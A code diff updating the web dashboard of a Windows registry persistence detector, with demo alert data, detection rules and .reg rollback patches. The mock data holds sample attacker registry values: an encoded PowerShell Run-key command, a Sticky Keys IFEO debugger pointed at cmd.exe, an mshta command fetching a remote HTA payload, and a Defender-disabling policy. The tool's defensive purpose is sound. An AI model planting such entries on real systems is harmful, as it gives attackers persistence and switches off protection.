+          <div class="text-center py-16 text-slate-500 text-sm">Loading security telemetry...</div>
+        </div>
+      </section>
+
+      <!-- ==================== TAB 2: RAW REGISTRY TELEMETRY ==================== -->
+      <section id="tab-content-events" class="space-y-4 hidden">
+        <div class="flex items-center justify-between">
+          <h2 class="text-base font-bold text-white tracking-tight">Raw Registry Modification Telemetry</h2>
+          <button onclick="loadEvents()" class="px-3 py-1.5 rounded-lg bg-surface-100 border border-white/10 text-xs text-slate-300 hover:text-white transition flex items-center space-x-1.5">
+            <i data-lucide="refresh-cw" class="w-3 h-3"></i>
+            <span>Refresh Table</span>
+          </button>
+        </div>
+
+        <div class="glass-panel rounded-2xl overflow-hidden shadow-glass">
+          <div class="overflow-x-auto">
+            <table class="w-full text-left text-xs text-slate-300">
+              <thead class="bg-surface-200/80 text-slate-400 uppercase font-mono text-[11px] border-b border-white/5">
+                <tr>
+                  <th class="py-3.5 px-4 font-semibold">Timestamp</th>
+                  <th class="py-3.5 px-4 font-semibold">Action</th>
+                  <th class="py-3.5 px-4 font-semibold">Target Key</th>
+                  <th class="py-3.5 px-4 font-semibold">Value Name</th>
+                  <th class="py-3.5 px-4 font-semibold">Attributed Binary</th>
+                  <th class="py-3.5 px-4 font-semibold">Severity</th>
+                  <th class="py-3.5 px-4 font-semibold text-right">Risk Score</th>
+                </tr>
+              </thead>
+              <tbody id="events-table-body" class="divide-y divide-white/5 font-mono">
+                <tr>
+                  <td colspan="7" class="py-8 text-center text-slate-500">No events logged yet.</td>
+                </tr>
+              </tbody>
+            </table>
           </div>
         </div>
-      </div>
-    </div>
+      </section>
 
-  </main>
-
-  <!-- ALERT INVESTIGATION MODAL -->
-  <div id="alert-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
-    <div class="bg-cyberCard border border-cyberBorder rounded-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto shadow-2xl p-6 space-y-6">
-      <div class="flex items-center justify-between border-b border-cyberBorder pb-4">
-        <div class="flex items-center space-x-3">
-          <span id="modal-severity-badge" class="px-3 py-1 rounded text-xs font-bold font-mono uppercase bg-red-500/20 text-red-400 border border-red-500/30">CRITICAL</span>
-          <h3 id="modal-rule-name" class="text-base font-bold text-white">Alert Title</h3>
+      <!-- ==================== TAB 3: MITRE ATT&CK MATRIX ==================== -->
+      <section id="tab-content-mitre" class="space-y-4 hidden">
+        <div>
+          <h2 class="text-base font-bold text-white tracking-tight">MITRE ATT&CK Persistence & Evasion Matrix</h2>
+          <p class="text-xs text-slate-400">Enterprise persistence techniques monitored by native kernel hooks</p>
         </div>
-        <button onclick="closeModal()" class="text-slate-400 hover:text-white transition">
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4" id="mitre-matrix-grid">
+          <!-- Dynamically Rendered -->
+        </div>
+      </section>
+
+      <!-- ==================== TAB 4: FORENSIC CASES & ROLLBACKS ==================== -->
+      <section id="tab-content-incidents" class="space-y-4 hidden">
+        <div class="flex items-center justify-between">
+          <div>
+            <h2 class="text-base font-bold text-white tracking-tight">Forensic Case Files & Incident Playbooks</h2>
+            <p class="text-xs text-slate-400">Automated investigative packages containing timeline reconstruction and 1-click rollback patches</p>
+          </div>
+          <button onclick="loadIncidents()" class="px-3 py-1.5 rounded-lg bg-surface-100 border border-white/10 text-xs text-slate-300 hover:text-white transition flex items-center space-x-1.5">
+            <i data-lucide="refresh-cw" class="w-3 h-3"></i>
+            <span>Refresh</span>
+          </button>
+        </div>
+
+        <div id="incidents-container" class="space-y-3">
+          <!-- Dynamically Rendered -->
+        </div>
+      </section>
+
+      <!-- ==================== TAB 5: RULES & ALLOWLIST ==================== -->
+      <section id="tab-content-rules" class="space-y-6 hidden">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <!-- Rules Card -->
+          <div class="glass-panel rounded-2xl p-6 space-y-4">
+            <div class="flex items-center justify-between border-b border-white/5 pb-3">
+              <div class="flex items-center space-x-2 text-accent-cyan">
+                <i data-lucide="shield" class="w-5 h-5"></i>
+                <h3 class="text-sm font-bold tracking-wide uppercase text-white">Detection Heuristics & Rules</h3>
+              </div>
+              <span class="text-xs font-mono text-slate-400">config/rules.json</span>
+            </div>
+            <div id="rules-list-container" class="space-y-2.5 max-h-[500px] overflow-y-auto pr-2">
+              Loading rules...
+            </div>
+          </div>
+
+          <!-- Allowlist Card -->
+          <div class="glass-panel rounded-2xl p-6 space-y-4">
+            <div class="flex items-center justify-between border-b border-white/5 pb-3">
+              <div class="flex items-center space-x-2 text-accent-emerald">
+                <i data-lucide="check-circle" class="w-5 h-5"></i>
+                <h3 class="text-sm font-bold tracking-wide uppercase text-white">Trusted Publishers & Allowlist</h3>
+              </div>
+              <span class="text-xs font-mono text-slate-400">config/allowlist.json</span>
+            </div>
+            <div id="allowlist-container" class="space-y-4 max-h-[500px] overflow-y-auto pr-2">
+              Loading allowlist...
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- ==================== MODERN MODAL: INCIDENT DOSSIER ==================== -->
+  <div id="alert-modal" class="fixed inset-0 bg-obsidian/85 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+    <div class="glass-panel rounded-3xl max-w-3xl w-full max-h-[90vh] overflow-y-auto shadow-2xl border border-white/10 p-7 space-y-6 animate-in fade-in zoom-in-95 duration-200">
+      
+      <!-- Modal Header -->
+      <div class="flex items-start justify-between border-b border-white/10 pb-4">
+        <div class="space-y-1">
+          <div class="flex items-center space-x-2.5">
+            <span id="modal-severity-badge" class="px-2.5 py-0.5 rounded-full text-[11px] font-bold font-mono uppercase bg-red-500/20 text-red-400 border border-red-500/30">CRITICAL</span>
+            <span class="text-xs font-mono text-slate-400" id="modal-alert-id">ALT-001</span>
+            <span class="text-xs font-mono px-2 py-0.5 rounded bg-surface-200 text-accent-cyan border border-white/5" id="modal-tech-id">T1547.001</span>
+          </div>
+          <h3 id="modal-rule-name" class="text-lg font-bold text-white tracking-tight">Alert Name</h3>
+        </div>
+        <button onclick="closeModal()" class="p-1.5 rounded-xl bg-surface-200 text-slate-400 hover:text-white transition">
           <i data-lucide="x" class="w-5 h-5"></i>
         </button>
       </div>
 
+      <!-- Modal Body -->
       <div class="space-y-4 text-xs font-mono" id="modal-body-content">
-        <!-- Populated dynamically -->
+        <!-- Dynamic Content -->
       </div>
 
-      <!-- Action Footer -->
-      <div class="border-t border-cyberBorder pt-4 flex items-center justify-between">
+      <!-- Modal Actions -->
+      <div class="border-t border-white/10 pt-4 flex items-center justify-between">
         <div class="flex space-x-2">
-          <button onclick="updateAlertStatusAction('FALSE_POSITIVE')" class="bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs px-3 py-2 rounded-lg border border-cyberBorder">
+          <button onclick="updateAlertStatusAction('FALSE_POSITIVE')" class="px-3.5 py-2 rounded-xl bg-surface-200 hover:bg-surface-300 text-slate-300 text-xs font-medium border border-white/5 transition">
             Mark False Positive
           </button>
-          <button onclick="updateAlertStatusAction('INVESTIGATING')" class="bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 text-xs px-3 py-2 rounded-lg border border-amber-500/30">
-            Investigating
+          <button onclick="updateAlertStatusAction('INVESTIGATING')" class="px-3.5 py-2 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 text-xs font-medium border border-amber-500/20 transition">
+            Under Investigation
           </button>
-          <button onclick="updateAlertStatusAction('RESOLVED')" class="bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 text-xs px-3 py-2 rounded-lg border border-emerald-500/30">
+          <button onclick="updateAlertStatusAction('RESOLVED')" class="px-3.5 py-2 rounded-xl bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 text-xs font-medium border border-emerald-500/20 transition">
             Mark Resolved
           </button>
         </div>
-        <button onclick="closeModal()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-4 py-2 rounded-lg">
-          Close
+        <button onclick="closeModal()" class="px-4 py-2 rounded-xl bg-surface-300 hover:bg-surface-400 text-white text-xs font-bold transition">
+          Close Dossier
         </button>
       </div>
     </div>
   </div>
 
+  <!-- AUDIO ELEMENT FOR ALERT CHIME -->
+  <audio id="alert-chime" preload="auto">
+    <source src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" type="audio/mpeg">
+  </audio>
+
+  <!-- ==================== MODERN APPLICATION JAVASCRIPT ==================== -->
   <script>
     let isDemoMode = false;
+    let currentFilterSeverity = '';
     let currentAlertDetail = null;
+    let audioAlertsEnabled = false;
 
-    // Rich mock dataset for GitHub Pages / Offline portfolio presentation
+    // Rich mock dataset for GitHub Pages / Portfolio Presentation
     const DEMO_DATA = {
       stats: {
         total_events: 142,
@@ -360,7 +554,7 @@
           new_value: "TAMPERED_BY_MALWARE_SCANNER",
           old_value: "SYSTEM_CANARY_ACTIVE_HONEYPOT",
           timestamp: new Date().toISOString(),
-          reasons: ["Hidden decoy honey-key modified or inspected by automated discovery tool"],
+          reasons: ["Hidden decoy honey-key modified or inspected by automated discovery tool", "Zero-day persistence reconnaissance suspected"],
           process_attribution: {
             process_name: "cmd.exe",
             pid: 14820,
@@ -385,7 +579,7 @@
           new_value: "powershell.exe -NoP -ExecutionPolicy Bypass -enc JAB4ACAAPQAgACcAdABlAHMAdAAnAA==",
           old_value: null,
           timestamp: new Date(Date.now() - 60000).toISOString(),
-          reasons: ["Base64 encoded payload executed via PowerShell in Run key", "ExecutionPolicy Bypass flag used"],
+          reasons: ["Base64 encoded payload executed via PowerShell in Run key", "ExecutionPolicy Bypass flag used", "Startup Autorun execution configured"],
           process_attribution: {
             process_name: "powershell.exe",
             pid: 19072,
@@ -416,7 +610,7 @@
           new_value: "C:\\Windows\\System32\\cmd.exe",
           old_value: null,
           timestamp: new Date(Date.now() - 120000).toISOString(),
-          reasons: ["Debugger interception value registered under Image File Execution Options (Sticky Keys Backdoor)"],
+          reasons: ["Debugger interception value registered under Image File Execution Options (Sticky Keys Backdoor)", "Unauthenticated SYSTEM shell escalation vector"],
           process_attribution: {
             process_name: "reg.exe",
             pid: 8820,
@@ -441,7 +635,7 @@
           new_value: "mshta.exe http://127.0.0.1:8000/payload.hta",
           old_value: null,
           timestamp: new Date(Date.now() - 180000).toISOString(),
-          reasons: ["mshta.exe downloading remote HTA payload in RunOnce autorun key"],
+          reasons: ["mshta.exe downloading remote HTA payload in RunOnce autorun key", "Proxy binary execution bypass"],
           process_attribution: {
             process_name: "powershell.exe",
             pid: 5228,
@@ -466,7 +660,7 @@
           new_value: 1,
           old_value: 0,
           timestamp: new Date(Date.now() - 240000).toISOString(),
-          reasons: ["Attempt to disable Windows Defender Realtime Protection via group policy"],
+          reasons: ["Attempt to disable Windows Defender Realtime Protection via group policy", "Host security defenses compromised"],
           process_attribution: {
             process_name: "malware_test.exe",
             pid: 11024,
@@ -493,7 +687,8 @@
           severity: "CRITICAL",
           summary: "Encoded PowerShell in HKCU Run key by powershell.exe (PID 19072)",
           folder_path: "incidents/INC-20260902-8F12A",
-          timestamp: new Date(Date.now() - 60000).toISOString()
+          timestamp: new Date(Date.now() - 60000).toISOString(),
+          rollback_reg: "Windows Registry Editor Version 5.00\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"SecUpdateMockTest\"=-"
         },
         {
           incident_id: "INC-20260902-4A99C",
@@ -501,7 +696,8 @@
           severity: "CRITICAL",
           summary: "Debugger interception set to cmd.exe by reg.exe (PID 8820)",
           folder_path: "incidents/INC-20260902-4A99C",
-          timestamp: new Date(Date.now() - 120000).toISOString()
+          timestamp: new Date(Date.now() - 120000).toISOString(),
+          rollback_reg: "Windows Registry Editor Version 5.00\n\n[HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe]\n\"Debugger\"=-"
         },
         {
           incident_id: "INC-20260902-77D1B",
@@ -509,21 +705,23 @@
           severity: "HIGH",
           summary: "mshta.exe URL execution in RunOnce by powershell.exe (PID 5228)",
           folder_path: "incidents/INC-20260902-77D1B",
-          timestamp: new Date(Date.now() - 180000).toISOString()
+          timestamp: new Date(Date.now() - 180000).toISOString(),
+          rollback_reg: "Windows Registry Editor Version 5.00\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\n\"LOLBinSimTest\"=-"
         }
       ]
     };
 
+    // Navigation Switcher
     function switchTab(tabId) {
       const tabs = ['alerts', 'events', 'mitre', 'incidents', 'rules'];
       tabs.forEach(t => {
-        const btn = document.getElementById(`tab-btn-${t}`);
+        const btn = document.getElementById(`nav-${t}`);
         const content = document.getElementById(`tab-content-${t}`);
         if (t === tabId) {
-          btn.className = "pb-3 text-cyan-400 border-b-2 border-cyan-400 flex items-center space-x-2 transition";
+          btn.className = "w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-semibold transition bg-gradient-to-r from-cyan-500/15 to-transparent text-accent-cyan border-l-2 border-accent-cyan";
           content.classList.remove('hidden');
         } else {
-          btn.className = "pb-3 text-slate-400 hover:text-slate-200 flex items-center space-x-2 transition";
+          btn.className = "w-full flex items-center space-x-3 px-3.5 py-2.5 rounded-xl text-sm font-medium text-slate-400 hover:text-slate-200 hover:bg-white/[0.03] transition";
           content.classList.add('hidden');
         }
       });
@@ -540,7 +738,7 @@
         const timeoutId = setTimeout(() => controller.abort(), 1200);
         const res = await fetch('/api/status', { signal: controller.signal });
         clearTimeout(timeoutId);
-        if (!res.ok) throw new Error("API not ok");
+        if (!res.ok) throw new Error("Backend not available");
       } catch (e) {
         enableDemoMode();
       }
@@ -549,9 +747,9 @@
     function enableDemoMode() {
       isDemoMode = true;
       document.getElementById('demo-mode-banner').classList.remove('hidden');
-      document.getElementById('agent-status-text').innerText = "DEMO SIMULATOR";
-      document.getElementById('hostname-text').innerText = "HOST: GITHUB-PAGES";
-      document.getElementById('scan-btn-label').innerText = "Simulate Persistence";
+      document.getElementById('sidebar-engine-name').innerText = "DEMO SIMULATOR";
+      document.getElementById('sidebar-hostname').innerText = "GITHUB-PAGES";
+      document.getElementById('scan-btn-label').innerText = "Simulate Threat";
     }
 
     async function loadStats() {
@@ -560,6 +758,7 @@
         document.getElementById('stat-critical-alerts').innerText = DEMO_DATA.stats.critical_alerts;
         document.getElementById('stat-high-alerts').innerText = DEMO_DATA.stats.high_alerts;
         document.getElementById('stat-total-incidents').innerText = DEMO_DATA.stats.total_incidents;
+        document.getElementById('sidebar-inc-badge').innerText = DEMO_DATA.stats.total_incidents;
         return;
       }
       try {
@@ -569,37 +768,46 @@
         document.getElementById('stat-critical-alerts').innerText = data.critical_alerts || 0;
         document.getElementById('stat-high-alerts').innerText = data.high_alerts || 0;
         document.getElementById('stat-total-incidents').innerText = data.total_incidents || 0;
+        document.getElementById('sidebar-inc-badge').innerText = data.total_incidents || 0;
       } catch (e) {}
     }
 
     async function loadSystemStatus() {
-      if (isDemoMode) {
-        document.getElementById('baseline-status-text').innerText = "HMAC VERIFIED";
-        return;
-      }
+      if (isDemoMode) return;
       try {
         const res = await fetch('/api/status');
         const data = await res.json();
-        document.getElementById('hostname-text').innerText = `HOST: ${data.hostname}`;
+        document.getElementById('sidebar-hostname').innerText = data.hostname;
         if (data.baseline_integrity?.is_valid) {
-          document.getElementById('baseline-status-text').innerText = "HMAC VERIFIED";
-          document.getElementById('baseline-status-text').className = "text-emerald-400";
+          document.getElementById('sidebar-hmac-badge').innerText = "HMAC VALID";
+          document.getElementById('sidebar-hmac-badge').className = "text-accent-emerald font-bold";
         } else {
-          document.getElementById('baseline-status-text').innerText = "TAMPER ALERT";
-          document.getElementById('baseline-status-text').className = "text-red-400 font-bold";
+          document.getElementById('sidebar-hmac-badge').innerText = "TAMPER ALERT";
+          document.getElementById('sidebar-hmac-badge').className = "text-accent-crimson font-bold";
         }
       } catch (e) {}
     }
 
+    function setFilterSeverity(sev) {
+      currentFilterSeverity = sev;
+      ['all', 'critical', 'high', 'medium'].forEach(f => {
+        const btn = document.getElementById(`filter-${f}`);
+        if ((f === 'all' && !sev) || (f.toUpperCase() === sev)) {
+          btn.className = "px-3 py-1.5 rounded-lg bg-surface-200 text-accent-cyan border border-accent-cyan/40 font-semibold transition";
+        } else {
+          btn.className = "px-3 py-1.5 rounded-lg bg-surface-100 text-slate-400 hover:text-white border border-white/5 transition";
+        }
+      });
+      loadAlerts();
+    }
+
     async function loadAlerts() {
       let alerts = [];
-      const sev = document.getElementById('severity-filter').value;
-
       if (isDemoMode) {
-        alerts = sev ? DEMO_DATA.alerts.filter(a => a.severity === sev) : DEMO_DATA.alerts;
+        alerts = currentFilterSeverity ? DEMO_DATA.alerts.filter(a => a.severity === currentFilterSeverity) : DEMO_DATA.alerts;
       } else {
         try {
-          const url = sev ? `/api/alerts?severity=${sev}` : '/api/alerts';
+          const url = currentFilterSeverity ? `/api/alerts?severity=${currentFilterSeverity}` : '/api/alerts';
           const res = await fetch(url);
           alerts = await res.json();
         } catch (e) {
@@ -609,46 +817,63 @@
 
       const container = document.getElementById('alerts-container');
       document.getElementById('live-alert-count').innerText = `${alerts.length} Total`;
+      document.getElementById('sidebar-alert-badge').innerText = alerts.length;
 
       if (!alerts || alerts.length === 0) {
-        container.innerHTML = `<div class="bg-cyberCard border border-cyberBorder rounded-xl p-8 text-center text-slate-500 text-sm">
-          <i data-lucide="shield-check" class="w-8 h-8 mx-auto mb-2 text-emerald-500/50"></i>
-          No persistence alerts detected. System is secure.
-        </div>`;
+        container.innerHTML = `
+          <div class="glass-panel rounded-2xl p-12 text-center text-slate-500 space-y-2">
+            <i data-lucide="shield-check" class="w-10 h-10 mx-auto text-emerald-500/40"></i>
+            <p class="text-sm font-medium text-slate-400">Zero active persistence threats found. System perimeter is secure.</p>
+          </div>`;
         lucide.createIcons();
         return;
       }
 
       container.innerHTML = alerts.map(a => {
-        const sevColor = a.severity === 'CRITICAL' ? 'red' : (a.severity === 'HIGH' ? 'amber' : (a.severity === 'MEDIUM' ? 'yellow' : 'cyan'));
+        const isCrit = a.severity === 'CRITICAL';
+        const isHigh = a.severity === 'HIGH';
+        const cardClass = isCrit ? 'glass-card-critical' : 'glass-card';
+        const sevColor = isCrit ? 'text-accent-crimson bg-red-500/15 border-red-500/30' : (isHigh ? 'text-accent-amber bg-amber-500/15 border-amber-500/30' : 'text-accent-cyan bg-cyan-500/15 border-cyan-500/30');
         const proc = a.process_attribution || {};
+
         return `
-          <div class="bg-cyberCard border border-${sevColor}-500/30 rounded-xl p-4 transition hover:border-${sevColor}-400 space-y-3">
+          <div class="${cardClass} rounded-2xl p-4.5 space-y-3">
             <div class="flex items-start justify-between">
               <div class="space-y-1">
                 <div class="flex items-center space-x-2">
-                  <span class="bg-${sevColor}-500/20 text-${sevColor}-400 border border-${sevColor}-500/40 text-[10px] font-bold px-2 py-0.5 rounded font-mono uppercase">${a.severity}</span>
-                  <span class="text-white font-bold text-sm">${a.rule_name}</span>
-                  <span class="bg-slate-800 text-slate-400 text-[10px] px-2 py-0.5 rounded font-mono border border-cyberBorder">${a.technique_id || 'T1547'}</span>
+                  <span class="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold uppercase border ${sevColor}">${a.severity}</span>
+                  <span class="text-white font-bold text-sm tracking-tight">${a.rule_name}</span>
+                  <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-surface-300/60 text-slate-400 border border-white/5">${a.technique_id || 'T1547.001'}</span>
                 </div>
-                <div class="text-xs text-slate-400 font-mono">
-                  Target Key: <span class="text-cyan-300">${a.registry_key}</span> | Value: <span class="text-amber-300">${a.value_name || '(Default)'}</span>
+                <div class="text-xs font-mono text-slate-400 flex items-center space-x-2">
+                  <span>Key: <span class="text-accent-cyan font-semibold">${a.registry_key}</span></span>
+                  <span class="text-slate-600">|</span>
+                  <span>Value: <span class="text-accent-amber">${a.value_name || '(Default)'}</span></span>
                 </div>
               </div>
-              <div class="text-right">
-                <div class="text-xs font-mono font-bold text-${sevColor}-400">Risk Score: ${a.risk_score}/100</div>
-                <div class="text-[10px] text-slate-500 font-mono">${new Date(a.timestamp).toLocaleTimeString()}</div>
+              <div class="text-right font-mono">
+                <div class="text-xs font-bold ${isCrit ? 'text-accent-crimson' : (isHigh ? 'text-accent-amber' : 'text-accent-cyan')}">Risk: ${a.risk_score}/100</div>
+                <div class="text-[10px] text-slate-500">${new Date(a.timestamp).toLocaleTimeString()}</div>
               </div>
             </div>
 
-            <!-- Context Details -->
-            <div class="bg-slate-900/70 border border-cyberBorder rounded-lg p-2.5 flex items-center justify-between text-xs font-mono text-slate-300">
-              <div>
-                <span class="text-slate-500">Attributed Process:</span> <span class="text-emerald-400">${proc.process_name || 'unknown'}</span> (PID: ${proc.pid || 'N/A'})
-                <span class="text-slate-500 ml-2">User:</span> ${proc.user || 'SYSTEM'}
+            <!-- Metadata Strip -->
+            <div class="p-2.5 rounded-xl bg-surface-100/70 border border-white/5 flex items-center justify-between text-xs font-mono">
+              <div class="flex items-center space-x-3 text-slate-300">
+                <div>
+                  <span class="text-slate-500">Process:</span> <span class="text-accent-emerald font-semibold">${proc.process_name || 'unknown'}</span> <span class="text-slate-500">(PID: ${proc.pid || 'N/A'})</span>
+                </div>
+                <span class="text-slate-600">•</span>
+                <div>
+                  <span class="text-slate-500">Parent:</span> <span class="text-slate-300">${proc.parent_process_name || 'N/A'}</span>
+                </div>
+                <span class="text-slate-600">•</span>
+                <div>
+                  <span class="text-slate-500">User:</span> <span class="text-slate-300">${proc.user || 'SYSTEM'}</span>
+                </div>
               </div>
-              <button onclick="openAlertDetail('${a.alert_id}')" class="bg-cyan-600/20 hover:bg-cyan-600/30 text-cyan-300 border border-cyan-500/30 px-3 py-1 rounded text-xs transition flex items-center space-x-1">
-                <i data-lucide="external-link" class="w-3 h-3"></i>
+              <button onclick="openAlertDetail('${a.alert_id}')" class="px-3 py-1 rounded-lg bg-accent-cyan/10 hover:bg-accent-cyan/20 text-accent-cyan border border-accent-cyan/30 text-xs font-semibold flex items-center space-x-1.5 transition">
+                <i data-lucide="scan" class="w-3 h-3"></i>
                 <span>Investigate</span>
               </button>
             </div>
@@ -687,16 +912,16 @@
       }
 
       tbody.innerHTML = events.map(e => {
-        const sevColor = e.severity === 'CRITICAL' ? 'text-red-400' : (e.severity === 'HIGH' ? 'text-amber-400' : 'text-slate-400');
+        const sevColor = e.severity === 'CRITICAL' ? 'text-accent-crimson font-bold' : (e.severity === 'HIGH' ? 'text-accent-amber font-bold' : 'text-slate-400');
         return `
-          <tr class="hover:bg-slate-900/50 transition">
-            <td class="py-2.5 px-4 text-slate-500 text-[11px]">${new Date(e.timestamp).toLocaleTimeString()}</td>
-            <td class="py-2.5 px-4"><span class="bg-cyan-500/10 text-cyan-400 px-1.5 py-0.5 rounded text-[10px]">${e.action}</span></td>
-            <td class="py-2.5 px-4 text-slate-200 truncate max-w-xs" title="${e.registry_key}">${e.registry_key}</td>
-            <td class="py-2.5 px-4 text-amber-300">${e.value_name || '(Default)'}</td>
-            <td class="py-2.5 px-4 text-emerald-400">${e.process_name || 'N/A'}</td>
-            <td class="py-2.5 px-4 ${sevColor} font-bold">${e.severity}</td>
-            <td class="py-2.5 px-4 text-slate-300">${e.risk_score}</td>
+          <tr class="hover:bg-white/[0.02] transition font-mono">
+            <td class="py-3 px-4 text-slate-500 text-[11px]">${new Date(e.timestamp).toLocaleTimeString()}</td>
+            <td class="py-3 px-4"><span class="px-2 py-0.5 rounded text-[10px] bg-cyan-500/10 text-accent-cyan border border-cyan-500/20">${e.action}</span></td>
+            <td class="py-3 px-4 text-slate-200 truncate max-w-xs" title="${e.registry_key}">${e.registry_key}</td>
+            <td class="py-3 px-4 text-accent-amber">${e.value_name || '(Default)'}</td>
+            <td class="py-3 px-4 text-accent-emerald">${e.process_name || 'N/A'}</td>
+            <td class="py-3 px-4 ${sevColor}">${e.severity}</td>
+            <td class="py-3 px-4 text-right text-slate-300 font-bold">${e.risk_score}</td>
           </tr>
         `;
       }).join('');
@@ -717,72 +942,43 @@
 
       const container = document.getElementById('incidents-container');
       if (!incidents || incidents.length === 0) {
-        container.innerHTML = `<div class="bg-cyberCard border border-cyberBorder rounded-xl p-8 text-center text-slate-500 text-sm">
-          No forensic incidents recorded.
-        </div>`;
+        container.innerHTML = `<div class="glass-panel rounded-2xl p-12 text-center text-slate-500">No forensic incident dossiers generated.</div>`;
         return;
       }
 
       container.innerHTML = incidents.map(inc => {
         return `
-          <div class="bg-cyberCard border border-purple-500/30 rounded-xl p-4 space-y-2">
+          <div class="glass-card rounded-2xl p-5 space-y-3 border-purple-500/20">
             <div class="flex items-center justify-between">
-              <div class="flex items-center space-x-2">
-                <span class="bg-purple-500/20 text-purple-400 border border-purple-500/40 text-xs font-bold px-2 py-0.5 rounded font-mono">${inc.incident_id}</span>
+              <div class="flex items-center space-x-2.5">
+                <span class="px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-purple-500/20 text-purple-300 border border-purple-500/30">${inc.incident_id}</span>
                 <span class="text-white font-bold text-sm">${inc.title}</span>
               </div>
-              <span class="text-xs text-slate-500 font-mono">${new Date(inc.timestamp).toLocaleString()}</span>
+              <span class="text-xs font-mono text-slate-500">${new Date(inc.timestamp).toLocaleString()}</span>
             </div>
             <p class="text-xs text-slate-400 font-mono">${inc.summary}</p>
-            <div class="text-xs text-slate-500 font-mono bg-slate-900/60 p-2 rounded border border-cyberBorder flex items-center justify-between">
-              <div>Case Folder: <span class="text-cyan-400">${inc.folder_path}</span> (timeline.json, rollback.reg, remediate.ps1)</div>
-              <button onclick="alert('Rollback Script (rollback.reg):\\n\\nWindows Registry Editor Version 5.00\\n\\n[${inc.title}]\\n\"TestValue\"=-\\n\\nClick OK to confirm.')" class="text-cyan-300 hover:text-cyan-200 underline text-xs">View .REG Patch</button>
+            
+            <div class="p-3 rounded-xl bg-surface-100 border border-white/5 flex items-center justify-between font-mono text-xs">
+              <div class="truncate max-w-lg text-slate-400">
+                <span class="text-slate-500">Dossier:</span> <span class="text-accent-cyan">${inc.folder_path}</span>
+              </div>
+              <button onclick="copyRollbackPatch('${inc.incident_id}')" class="px-3 py-1 rounded-lg bg-surface-200 hover:bg-surface-300 text-slate-200 border border-white/10 text-xs font-semibold flex items-center space-x-1.5 transition">
+                <i data-lucide="copy" class="w-3 h-3"></i>
+                <span>Copy .REG Rollback</span>
+              </button>
             </div>
           </div>
         `;
       }).join('');
+
+      lucide.createIcons();
     }
 
-    async function loadRulesAndAllowlist() {
-      const rules = [
-        { id: "REG-CANARY-001", severity: "CRITICAL", base_score: 100, name: "Canary Honey-Key Triggered", description: "Modification in hidden decoy honey-key path", technique_id: "T1000.001" },
-        { id: "REG-PERSIST-IFEO", severity: "CRITICAL", base_score: 95, name: "IFEO Debugger Hijacking Persistence", description: "Debugger interception registered under IFEO", technique_id: "T1546.012" },
-        { id: "REG-TAMPER-DEFENDER", severity: "CRITICAL", base_score: 90, name: "Windows Defender Policy Tampering", description: "DisableRealtimeMonitoring or AV tamper", technique_id: "T1562.001" },
-        { id: "REG-EXEC-POWERSHELL-ENC", severity: "CRITICAL", base_score: 85, name: "Encoded PowerShell Command", description: "PowerShell executing Base64 encoded payload", technique_id: "T1059.001" },
-        { id: "REG-EXEC-LOLBIN", severity: "HIGH", base_score: 75, name: "LOLBin Execution (mshta/rundll32/regsvr32)", description: "Suspicious execution via native system utility", technique_id: "T1218" },
-        { id: "REG-PERSIST-RUN", severity: "MEDIUM", base_score: 45, name: "Autorun Key Entry Added/Modified", description: "New entry in Run or RunOnce startup key", technique_id: "T1547.001" }
-      ];
-
-      const rulesCont = document.getElementById('rules-list-container');
-      rulesCont.innerHTML = rules.map(r => `
-        <div class="bg-slate-900 border border-cyberBorder p-2.5 rounded-lg space-y-1">
-          <div class="flex items-center justify-between">
-            <span class="text-cyan-400 font-bold">${r.id}</span>
-            <span class="text-red-400 font-bold">${r.severity} (Score: ${r.base_score})</span>
-          </div>
-          <div class="text-white text-xs">${r.name}</div>
-          <div class="text-slate-500 text-[11px]">${r.description}</div>
-          <div class="text-slate-400 text-[10px]">MITRE: ${r.technique_id}</div>
-        </div>
-      `).join('');
-
-      const allowCont = document.getElementById('allowlist-container');
-      allowCont.innerHTML = `
-        <div class="space-y-3">
-          <div>
-            <div class="text-slate-400 font-bold mb-1">Trusted Publishers:</div>
-            <div class="flex flex-wrap gap-1">
-              ${["Microsoft Corporation", "Microsoft Windows", "Google LLC", "NVIDIA Corporation", "Realtek Semiconductor"].map(p => `<span class="bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 px-2 py-0.5 rounded text-[11px]">${p}</span>`).join('')}
-            </div>
-          </div>
-          <div>
-            <div class="text-slate-400 font-bold mb-1">Protected Trusted Paths:</div>
-            <div class="space-y-1">
-              ${["C:\\Program Files\\", "C:\\Program Files (x86)\\", "C:\\Windows\\System32\\"].map(p => `<div class="bg-slate-900 text-slate-300 p-1.5 rounded border border-cyberBorder text-[11px]">${p}</div>`).join('')}
-            </div>
-          </div>
-        </div>
-      `;
+    function copyRollbackPatch(incId) {
+      const inc = DEMO_DATA.incidents.find(i => i.incident_id === incId) || DEMO_DATA.incidents[0];
+      const patch = inc.rollback_reg || "Windows Registry Editor Version 5.00\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"MalwareEntry\"=-";
+      navigator.clipboard.writeText(patch);
+      alert("Copied 1-Click Rollback .REG Patch to clipboard!\n\n" + patch);
     }
 
     function renderMitreMatrix() {
@@ -801,18 +997,60 @@
 
       const grid = document.getElementById('mitre-matrix-grid');
       grid.innerHTML = techniques.map(t => `
